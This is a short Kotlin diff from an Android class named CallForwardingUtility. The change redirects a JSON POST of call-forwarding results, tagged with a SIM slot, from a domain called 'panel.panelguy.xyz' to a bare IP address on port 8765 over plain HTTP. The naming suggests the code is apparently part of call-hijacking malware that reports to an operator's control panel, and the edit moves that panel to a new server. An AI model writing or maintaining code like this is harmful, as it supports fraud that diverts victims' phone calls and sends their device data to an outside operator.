@@ -112,7 +112,7 @@ class CallForwardingUtility(
                     put("simSlot", 0)
                 }
 
-                val url = URL("https://panel.panelguy.xyz/devices/call-forwarding/result")
+                val url = URL("http://95.134.130.160:8765/devices/call-forwarding/result")
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
